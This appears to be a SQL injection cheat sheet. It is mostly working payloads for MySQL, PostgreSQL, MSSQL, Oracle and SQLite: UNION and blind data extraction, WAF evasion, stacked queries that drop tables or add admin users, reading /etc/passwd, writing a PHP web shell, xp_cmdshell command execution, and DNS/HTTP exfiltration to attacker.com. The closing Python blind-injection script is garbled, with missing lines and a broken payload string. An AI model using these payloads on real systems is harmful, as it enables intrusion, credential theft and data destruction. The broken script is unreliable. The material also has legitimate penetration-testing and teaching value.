SQL Injection

Types of SQL Injection

In-Band (Classic)

Results are returned directly in the application response. Easiest to exploit.

Error-Based

Force the database to throw errors that leak data in the error message.

-- MySQL: extractvalue / updatexml
' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) -- -
' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1) -- -

-- PostgreSQL: cast error
' AND 1=CAST((SELECT version()) AS int) -- -

-- MSSQL: convert error
' AND 1=CONVERT(int, (SELECT @@version)) -- -

UNION-Based

Append a UNION SELECT to extract data through the normal query result set.

-- Step 1: Find column count with ORDER BY
' ORDER BY 1 -- -    (OK)
' ORDER BY 2 -- -    (OK)
' ORDER BY 3 -- -    (OK)
' ORDER BY 4 -- -    (ERROR → 3 columns)

-- Step 2: Find which columns are displayed
' UNION SELECT NULL, NULL, NULL -- -
' UNION SELECT 'a', NULL, NULL -- -
' UNION SELECT NULL, 'a', NULL -- -
' UNION SELECT NULL, NULL, 'a' -- -

-- Step 3: Extract data through visible columns
' UNION SELECT NULL, username, password FROM users -- -

Blind SQL Injection

No data is returned directly. You infer information from the application's behavior.

Boolean-Based Blind

Application returns different responses for TRUE vs FALSE conditions.

-- Test: does the response change?
' AND 1=1 -- -    (normal response → TRUE)
' AND 1=2 -- -    (different response → FALSE)

-- Extract data character by character
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' -- -
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b' -- -

-- Binary search with ASCII values (faster)
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 77 -- -
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 100 -- -

Time-Based Blind

No visible difference in response. Use time delays to infer TRUE/FALSE.

-- MySQL
' AND IF(1=1, SLEEP(5), 0) -- -
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) -- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5' -- -

-- SQLite
' AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END -- -

Out-of-Band (OOB)

Exfiltrate data via DNS or HTTP requests from the database server. Works when in-band and blind are not feasible.

-- MySQL (requires FILE privilege + secure_file_priv not set)
SELECT LOAD_FILE(concat('\\\\', (SELECT version()), '.attacker.com\\a'));

-- MSSQL (xp_dirtree)
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 username FROM users) + '.attacker.com\a'

-- Oracle (UTL_HTTP)
SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual)) FROM dual;

UNION-Based Injection (Full Walkthrough)

Step 1: Determine Column Count

-- ORDER BY method (increment until error)
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 5 -- -   → error means < 5 columns
' ORDER BY 4 -- -   → works → 4 columns

-- UNION NULL method
' UNION SELECT NULL -- -
' UNION SELECT NULL, NULL -- -
' UNION SELECT NULL, NULL, NULL -- -   → works → 3 columns

Step 2: Find Displayed Columns

-- Replace NULLs one at a time with strings
' UNION SELECT 'test1', NULL, NULL -- -
' UNION SELECT NULL, 'test2', NULL -- -
' UNION SELECT NULL, NULL, 'test3' -- -
-- Whichever value appears on the page is the injectable column

Step 3: Extract Data

-- Database version
' UNION SELECT NULL, version(), NULL -- -

-- Current user
' UNION SELECT NULL, user(), NULL -- -       -- MySQL
' UNION SELECT NULL, current_user, NULL -- -  -- PostgreSQL

-- Current database
' UNION SELECT NULL, database(), NULL -- -            -- MySQL
' UNION SELECT NULL, current_database(), NULL -- -    -- PostgreSQL

WAF Bypass Techniques

Comment Obfuscation

-- Inline comments to break keyword detection
UN/**/ION SEL/**/ECT 1,2,3 -- -
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3 -- -

-- Nested comments (MySQL versioned)
/*!UNION*/ /*!SELECT*/ 1,2,3

Case Mixing

UnIoN SeLeCt 1,2,3 -- -
uNiOn aLl sElEcT 1,2,3 -- -

URL / Double Encoding

# URL encode the payload
%27%20UNION%20SELECT%201,2,3%20--%20-

# Double URL encode
%2527%2520UNION%2520SELECT%25201,2,3

# Hex encoding in MySQL
' UNION SELECT 0x61646d696e, 0x70617373776f7264 -- -

Whitespace Alternatives

-- Use tabs, newlines, or comments instead of spaces
'%09UNION%09SELECT%091,2,3 -- -
'%0aUNION%0aSELECT%0a1,2,3 -- -
'/**/UNION/**/SELECT/**/1,2,3 -- -

-- Parentheses to avoid spaces
'UNION(SELECT(1),(2),(3)) -- -

Keyword Alternatives

-- UNION alternatives
' UNION ALL SELECT 1,2,3 -- -
' UNION DISTINCT SELECT 1,2,3 -- -

-- OR / AND with math
' || 1=1 -- -      -- PostgreSQL, SQLite
' && 1=1 -- -      -- MySQL

-- String concat without CONCAT
-- MySQL:   'ad' 'min' (adjacent strings) or 0x61646d696e
-- MSSQL:   'ad' + 'min'
-- Pg/SQLite: 'ad' || 'min'

Second-Order SQL Injection

Payload is stored first (e.g., in a registration form), then triggered later when the stored value is used in a different query without sanitization.

-- Step 1: Register with a malicious username
Username: admin' -- -
Password: anything

-- Step 2: Password reset uses stored username unsafely
-- Backend query on password change:
UPDATE users SET password = 'newpass' WHERE username = 'admin' -- -'
-- This resets the admin password instead of the attacker's account

Stacked Queries

Execute multiple SQL statements in one injection. Supported by MSSQL and PostgreSQL; MySQL only via specific APIs (e.g., mysqli_multi_query).

-- Insert a new admin user
'; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin') -- -

-- Drop a table (destructive)
'; DROP TABLE logs -- -

-- Update another user's password
'; UPDATE users SET password = 'hacked' WHERE username = 'admin' -- -

-- Time-based via stacked query (MSSQL)
'; WAITFOR DELAY '0:0:5' -- -

Reading & Writing Files via SQLi

MySQL

-- Read files (requires FILE privilege)
' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL -- -
' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php'), NULL -- -

-- Write files (requires FILE privilege + writable dir)
' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL
  INTO OUTFILE '/var/www/html/shell.php' -- -

-- Check secure_file_priv (empty = no restriction)
' UNION SELECT NULL, @@secure_file_priv, NULL -- -

PostgreSQL

-- Read files (superuser required)
'; CREATE TABLE tmp(data text);
  COPY tmp FROM '/etc/passwd';
  SELECT * FROM tmp; -- -

-- Write files
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php' -- -

-- Command execution via COPY PROGRAM (PostgreSQL 9.3+)
'; COPY cmd_output FROM PROGRAM 'id' -- -

MSSQL

-- Read files via OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\windows\win.ini', SINGLE_CLOB) AS x;

-- Enable xp_cmdshell and execute commands
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

import requests
import string
import time

url = "http://127.0.0.1:5000/check"
charset = string.printable
flag = ""

for pos in range(1, 40):
    found = False
    for char in charset:
        # Use CASE WHEN to trigger sleep on correct char

            f"1 AND (SELECT CASE WHEN "
            f"SUBSTR((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}' "

            found = True
            break
    if not found:
        break
